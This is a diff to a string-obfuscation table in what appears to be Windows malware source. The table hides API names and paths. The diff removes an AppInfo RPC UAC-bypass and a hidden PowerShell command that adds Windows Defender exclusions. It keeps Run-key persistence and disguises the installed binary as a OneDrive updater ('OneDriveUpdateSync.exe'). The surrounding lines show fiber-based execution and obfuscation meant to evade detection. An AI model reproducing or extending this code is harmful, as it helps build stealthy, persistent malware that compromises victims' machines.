@@ -70,48 +70,16 @@ OBFUSCATED_STRINGS = {
     "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
     "XSTR_CREATE_FIBER":            "CreateFiber",
     "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
-    # Uac.c (AppInfo RPC UAC bypass)
-    "XSTR_NCALRPC":                 "ncalrpc",
-    "XSTR_APPINFO_UUID":            "201ef99a-7fa0-444c-9399-19ba84f12a1a",
-    "XSTR_WINSTA_DEFAULT":          "WinSta0\\Default",
-    "XSTR_WINVER_EXE":              "\\winver.exe",
-    "XSTR_COMPUTERDEFAULTS_EXE":    "\\ComputerDefaults.exe",
-    # PowerShell WD-exclusion command pieces
-    "XSTR_PS_EXE":                  "powershell.exe",
-    "XSTR_WD_PS_FLAGS":             " -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '",
-    "XSTR_WD_CMD_SUFFIX":           "'\"",
-    # rpcrt4.dll RPC functions
-    "XSTR_RPCRT4_DLL":              "rpcrt4.dll",
-    "XSTR_RPC_STRING_BIND_COMP":    "RpcStringBindingComposeW",
-    "XSTR_RPC_BIND_FROM_STR":       "RpcBindingFromStringBindingW",
-    "XSTR_RPC_STRING_FREE":         "RpcStringFreeW",
-    "XSTR_RPC_BIND_SET_AUTH":       "RpcBindingSetAuthInfoExW",
-    "XSTR_RPC_ASYNC_INIT":          "RpcAsyncInitializeHandle",
-    "XSTR_RPC_ASYNC_COMPLETE":      "RpcAsyncCompleteCall",
-    "XSTR_RPC_BIND_FREE":           "RpcBindingFree",
-    "XSTR_NDR_ASYNC_CALL":          "NdrAsyncClientCall",
-    "XSTR_NDR_OLE_ALLOC":           "NdrOleAllocate",
-    "XSTR_NDR_OLE_FREE":            "NdrOleFree",
-    "XSTR_CREATE_WELL_KNOWN_SID":   "CreateWellKnownSid",
-    # Install.c (first-run installer — UAC builds)
+    # Install.c (first-run installer)
     "XSTR_APPDATA_VAR":             "APPDATA",
-    "XSTR_INSTALL_SUBDIR":          "\\Microsoft\\Office\\Updates\\",
-    "XSTR_PERSIST_EXE_NAME":        "msoia.exe",
-    "XSTR_STARTUP_VALUE_NAME":      "Office Telemetry Agent",
-    "XSTR_STARTUP_APPROVED_KEY":    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
+    "XSTR_INSTALL_SUBDIR":          "\\OneDrive\\Updates\\",
+    "XSTR_PERSIST_EXE_NAME":        "OneDriveUpdateSync.exe",
     "XSTR_GET_ENV_VAR_A":           "GetEnvironmentVariableA",
     "XSTR_CREATE_DIRECTORY_A":      "CreateDirectoryA",
-    "XSTR_SET_FILE_ATTR_A":         "SetFileAttributesA",
-    # Registry functions
-    "XSTR_REG_OPEN_KEY_EX_A":       "RegOpenKeyExA",
-    "XSTR_REG_CREATE_KEY_EX_A":     "RegCreateKeyExA",
-    "XSTR_REG_SET_VALUE_EX_A":      "RegSetValueExA",
-    "XSTR_REG_CLOSE_KEY":           "RegCloseKey",
-    # Persist.c + legacy
+    # Persist.c
     "XSTR_ADVAPI32_DLL":            "advapi32.dll",
-    "XSTR_WD_EXCL_PATH":            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
     "XSTR_RUN_KEY_PATH":            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-    "XSTR_PERSIST_NAME":            "OfficeUpdate",
+    "XSTR_PERSIST_NAME":            "OneDriveUpdateSync",
 }
 
 
